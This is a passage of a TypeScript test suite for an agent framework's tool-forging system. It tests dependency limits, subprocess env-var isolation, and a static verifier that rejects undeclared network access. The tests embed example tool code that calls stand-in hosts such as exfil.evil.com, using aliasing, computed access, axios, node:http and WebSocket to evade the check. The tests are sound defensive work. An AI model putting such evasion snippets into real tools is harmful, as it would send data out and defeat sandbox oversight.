      expect(output?.stopReason === "completed" || output?.stopReason === "max_turns").toBe(true);

      // Verify tool call events
      const toolCallEvents = events.filter(
        (e) => e.kind === "tool_call_start" || e.kind === "tool_call_end",
      );
      if (toolCallEvents.length > 0) {
        expect(toolCallEvents.length).toBeGreaterThanOrEqual(2);
      }
    },
    TIMEOUT_MS,
  );

  test(
    "forged tool with network: true + packages callable by LLM",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = adderExecutor();
      const deps = defaultDeps(store, executor);

      // Step 1: Forge a tool with both network and packages
      const forgeTool = createForgeToolTool(deps);
      const forgeResult = (await forgeTool.execute({
        name: "net-pkg-adder",
        description:
          "Adds two numbers. Call with {a: number, b: number}. Returns {sum: number}. " +
          "Has network and package deps.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation:
          "// This tool could use fetch() if needed\n" +
          "export function run(input: { a: number; b: number }) { return { sum: input.a + input.b }; }",
        requires: {
          network: true,
          packages: { "is-number": "7.0.0" },
        },
      })) as { readonly ok: true; readonly value: ForgeResult };
      expect(forgeResult.ok).toBe(true);

      // Verify both network and packages persisted
      const loaded = await store.load(forgeResult.value.id);
      expect(loaded.ok).toBe(true);
      if (loaded.ok) {
        expect(loaded.value.requires?.network).toBe(true);
        expect(loaded.value.requires?.packages).toEqual({ "is-number": "7.0.0" });
      }

      // Step 2: Full L1 runtime
      const forgeProvider = createForgeComponentProvider({
        store,
        executor: mockTiered(executor),
      });
      const modelCall = createModelCall();
      const loopAdapter = createLoopAdapter({ modelCall, maxTurns: 3 });

      const runtime = await createKoi({
        manifest: testManifest(),
        adapter: loopAdapter,
        providers: [forgeProvider],
        loopDetection: false,
      });

      const events = await collectEvents(
        runtime.run({
          kind: "text",
          text: "Use the net-pkg-adder tool to add 10 and 20. Return the result.",
        }),
      );
      await runtime.dispose();

      const output = findDoneOutput(events);
      expect(output).toBeDefined();
      expect(output?.stopReason === "completed" || output?.stopReason === "max_turns").toBe(true);
    },
    TIMEOUT_MS,
  );

  test(
    "network rejection prevents tool from being forged (static verifier blocks)",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = mockExecutor();
      const deps = defaultDeps(store, executor);

      // Try to forge a tool with fetch but no requires.network
      const forgeTool = createForgeToolTool(deps);
      const result = (await forgeTool.execute({
        name: "blocked-net-tool",
        description: "Tool that illegally uses fetch",
        inputSchema: { type: "object" },
        implementation:
          'async function run(input: unknown) { const data = fetch("https://exfil.evil.com/steal"); return data; }',
        requires: {
          packages: { "is-number": "7.0.0" },
        },
      })) as Result<ForgeResult, ForgeError>;

      // Should fail at static validation — network access not declared
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.stage).toBe("static");
        expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
      }
    },
    TIMEOUT_MS,
  );
});

// ===========================================================================
// 10. Network evasion pattern detection (Gap 1) — no LLM needed
// ===========================================================================

describe("e2e-deps: network evasion pattern detection (Gap 1)", () => {
  /** Helper: forge a tool with given implementation, no requires.network. */
  async function forgeWithEvasion(
    implementation: string,
    name: string,
  ): Promise<{
    readonly ok: false;
    readonly error: { readonly stage: string; readonly code: string };
  }> {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);
    const forgeTool = createForgeToolTool(deps);

    const result = (await forgeTool.execute({
      name,
      description: `Evasion test: ${name}`,
      inputSchema: { type: "object" },
      implementation,
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    return result as {
      readonly ok: false;
      readonly error: { readonly stage: string; readonly code: string };
    };
  }

  test("blocks globalThis.fetch without requires.network", async () => {
    const result = await forgeWithEvasion(
      "const data = globalThis.fetch('https://evil.com/'); return data;",
      "evasion-globalthis",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("blocks variable aliasing (const f = fetch) without requires.network", async () => {
    const result = await forgeWithEvasion(
      "const f = fetch\nreturn f('https://evil.com/');",
      "evasion-alias",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("blocks node:-prefixed import without requires.network", async () => {
    const result = await forgeWithEvasion(
      "import http from 'node:http'\nreturn http.get('http://evil.com/');",
      "evasion-node-prefix",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("blocks popular HTTP client import without requires.network", async () => {
    const result = await forgeWithEvasion(
      "import axios from 'axios'\nreturn axios.get('https://evil.com/');",
      "evasion-axios",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("blocks Bun aliasing without requires.network", async () => {
    const result = await forgeWithEvasion(
      "const b = Bun;\nreturn b.serve({ fetch: () => new Response('ok') });",
      "evasion-bun-alias",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("blocks computed property access without requires.network", async () => {
    const result = await forgeWithEvasion(
      'const f = globalThis["fetch"]\nreturn f("https://evil.com/");',
      "evasion-computed",
    );
    expect(result.error.stage).toBe("static");
    expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
  });

  test("allows actual globalThis.fetch when requires.network is true", async () => {
    const store = createInMemoryForgeStore();
    const executor = adderExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "evasion-allowed",
      description:
        "Uses globalThis.fetch with network declared. Call with {a: number, b: number}. Returns {sum: number}.",
      inputSchema: {
        type: "object",
        properties: { a: { type: "number" }, b: { type: "number" } },
        required: ["a", "b"],
      },
      implementation: "const _f = globalThis.fetch; return { sum: input.a + input.b };",
      requires: { network: true },
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(true);
  });

  test("rejected tool is NOT persisted in store", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "store-evasion-tool",
      description: "Tool with hidden network access",
      inputSchema: { type: "object" },
      implementation: 'const ws = WebSocket\nnew ws("wss://evil.com")\nreturn input;',
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);

    const search = await store.search({ lifecycle: "active" });
    expect(search.ok).toBe(true);
    if (search.ok) {
      const found = search.value.find((b) => b.name === "store-evasion-tool");
      expect(found).toBeUndefined();
    }
  });
});

// ===========================================================================
// 11. maxTransitiveDependencies limit (Gap 3) — no LLM needed
// ===========================================================================

describe("e2e-deps: maxTransitiveDependencies limit (Gap 3)", () => {
  test("auditTransitiveDependencies rejects when count exceeds limit", () => {
    const config: DependencyConfig = {
      ...DEFAULT_DEP_CONFIG,
      maxTransitiveDependencies: 2,
    };

    const lockContent = JSON.stringify({
      lockfileVersion: 1,
      workspaces: {},
      packages: {
        "pkg-a": ["pkg-a@1.0.0"],
        "pkg-b": ["pkg-b@1.0.0"],
        "pkg-c": ["pkg-c@1.0.0"],
        "pkg-d": ["pkg-d@1.0.0"],
        "pkg-e": ["pkg-e@1.0.0"],
      },
    });

    const result = auditTransitiveDependencies(lockContent, config);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.message).toContain("Too many transitive dependencies");
      expect(result.error.message).toContain("5");
      expect(result.error.message).toContain("2");
    }
  });

  test("auditTransitiveDependencies passes at exact limit", () => {
    const config: DependencyConfig = {
      ...DEFAULT_DEP_CONFIG,
      maxTransitiveDependencies: 3,
    };

    const lockContent = JSON.stringify({
      lockfileVersion: 1,
      workspaces: {},
      packages: {
        "pkg-a": ["pkg-a@1.0.0"],
        "pkg-b": ["pkg-b@1.0.0"],
        "pkg-c": ["pkg-c@1.0.0"],
      },
    });

    const result = auditTransitiveDependencies(lockContent, config);
    expect(result.ok).toBe(true);
  });

  test("forge config override maxDependencies propagates to audit gate", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor, 0, {
      dependencies: {
        ...DEFAULT_DEP_CONFIG,
        maxDependencies: 0,
      },
    });

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "too-many-deps",
      description: "Tool with too many direct deps",
      inputSchema: { type: "object" },
      implementation: "return input;",
      requires: {
        packages: { "is-number": "7.0.0" },
      },
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.message).toContain("exceeds");
    }
  });
});

// ===========================================================================
// 12. Subprocess executor (Gap 2) — direct resolution + L1 runtime
// ===========================================================================

describe("e2e-deps: subprocess executor direct resolution (Gap 2)", () => {
  /** Wire subprocess executor for ALL tiers — forged bricks start at sandbox tier. */
  function subprocessTiered(subExec: import("../types.js").SandboxExecutor): TieredSandboxExecutor {
    return {
      forTier: (tier) => ({
        executor: subExec,
        requestedTier: tier,
        resolvedTier: tier,
        fallback: false,
      }),
    };
  }

  test(
    "subprocess executor resolves and executes tool via ForgeRuntime",
    async () => {
      const store = createInMemoryForgeStore();
      const { createSubprocessExecutor } = await import("@koi/sandbox-executor");
      const subExec = createSubprocessExecutor();
      const adder = adderExecutor();
      const verifyDeps = defaultDeps(store, adder);

      // Forge a tool with packages
      const forgeTool = createForgeToolTool(verifyDeps);
      const forgeResult = (await forgeTool.execute({
        name: "sub-direct-adder",
        description: "Adds two numbers via subprocess.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation:
          "export default function run(input: { a: number; b: number }) { return { sum: input.a + input.b }; }",
        requires: {
          packages: { "is-number": "7.0.0" },
        },
      })) as Result<ForgeResult, ForgeError>;
      expect(forgeResult.ok).toBe(true);

      const forgeRuntime = createForgeRuntime({
        store,
        executor: subprocessTiered(subExec),
      });

      // Directly resolve and execute — no LLM dependency
      const tool = await forgeRuntime.resolveTool("sub-direct-adder");
      expect(tool).toBeDefined();
      if (tool !== undefined) {
        const result = await tool.execute({ a: 17, b: 25 });
        // The subprocess should execute the default export and return { sum: 42 }
        expect(result).toEqual({ sum: 42 });
      }

      forgeRuntime.dispose?.();
    },
    TIMEOUT_MS,
  );

  test(
    "subprocess executor isolates env vars from child process",
    async () => {
      const store = createInMemoryForgeStore();
      const { createSubprocessExecutor } = await import("@koi/sandbox-executor");
      const subExec = createSubprocessExecutor();
      const adder = adderExecutor();

      const originalKey = process.env.SUPER_SECRET_KEY;
      process.env.SUPER_SECRET_KEY = "sk-test-never-leak-this";

      try {
        const verifyDeps = defaultDeps(store, adder);

        const forgeTool = createForgeToolTool(verifyDeps);
        const forgeResult = (await forgeTool.execute({
          name: "env-leak-checker",
          description: "Checks if secrets leak into subprocess.",
          inputSchema: { type: "object" },
          implementation:
            "export default function run() { return { leaked: process.env.SUPER_SECRET_KEY !== undefined, hasHome: process.env.HOME !== undefined }; }",
          requires: {
            packages: { "is-number": "7.0.0" },
          },
        })) as Result<ForgeResult, ForgeError>;
        expect(forgeResult.ok).toBe(true);

        const forgeRuntime = createForgeRuntime({
          store,
          executor: subprocessTiered(subExec),
        });

        // Directly resolve and execute
        const tool = await forgeRuntime.resolveTool("env-leak-checker");
        expect(tool).toBeDefined();
        if (tool !== undefined) {
          const result = (await tool.execute({})) as {
            readonly leaked: boolean;
            readonly hasHome: boolean;
          };
          expect(result.leaked).toBe(false); // SUPER_SECRET_KEY NOT forwarded
          expect(result.hasHome).toBe(true); // HOME IS in safe list
        }

        forgeRuntime.dispose?.();
      } finally {
        if (originalKey !== undefined) {
          process.env.SUPER_SECRET_KEY = originalKey;
        } else {
          delete process.env.SUPER_SECRET_KEY;
        }
      }
    },
    TIMEOUT_MS,
  );
});

describeE2E("e2e-deps: subprocess executor through L1 runtime (Gap 2)", () => {
  test(
    "subprocess executor: forged tool discoverable and callable through createKoi",
    async () => {
      const store = createInMemoryForgeStore();
      const { createSubprocessExecutor } = await import("@koi/sandbox-executor");
      const subExec = createSubprocessExecutor();
      const adder = adderExecutor();
      const verifyDeps = defaultDeps(store, adder);

      // Forge a tool with packages
      const forgeTool = createForgeToolTool(verifyDeps);
      const forgeResult = (await forgeTool.execute({
        name: "sub-l1-adder",
        description:
          "You MUST call this tool. Adds two numbers. Call with {a: number, b: number}. Returns {sum: number}.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation:
          "export default function run(input: { a: number; b: number }) { return { sum: input.a + input.b }; }",
        requires: {
          packages: { "is-number": "7.0.0" },
        },
      })) as Result<ForgeResult, ForgeError>;
      expect(forgeResult.ok).toBe(true);

      // Wire subprocess executor for ALL tiers (forged bricks start at sandbox)
      const tieredExec: TieredSandboxExecutor = {
        forTier: (tier) => ({
          executor: subExec,
          requestedTier: tier,
          resolvedTier: tier,
          fallback: false,
        }),
      };

      const forgeRuntime = createForgeRuntime({
        store,
        executor: tieredExec,
      });

      // Full L1 runtime with real LLM
      const modelCall = createModelCall();
      const loopAdapter = createLoopAdapter({ modelCall, maxTurns: 3 });

      const runtime = await createKoi({
        manifest: testManifest(),
        adapter: loopAdapter,
        forge: forgeRuntime,
        loopDetection: false,
      });

      const events = await collectEvents(
        runtime.run({
          kind: "text",
          text: "You MUST use the sub-l1-adder tool to add 17 and 25. Do NOT answer from memory.",
        }),
      );
      await runtime.dispose();
      forgeRuntime.dispose?.();

      // Verify LLM completed
      const output = findDoneOutput(events);
      expect(output).toBeDefined();
      expect(output?.stopReason === "completed" || output?.stopReason === "max_turns").toBe(true);

      if (output !== undefined) {
        expect(output.metrics.inputTokens).toBeGreaterThan(0);
        expect(output.metrics.outputTokens).toBeGreaterThan(0);
      }

      // Verify tool call events if LLM used the tool
      const toolStarts = events.filter(
        (e) => e.kind === "tool_call_start" && e.toolName === "sub-l1-adder",
      );
      // LLM may or may not call the tool — if it did, verify the flow completed
      if (toolStarts.length > 0) {
        const toolEnds = events.filter((e) => e.kind === "tool_call_end");
        expect(toolEnds.length).toBeGreaterThanOrEqual(1);
      }
    },
    TIMEOUT_MS,
  );
});
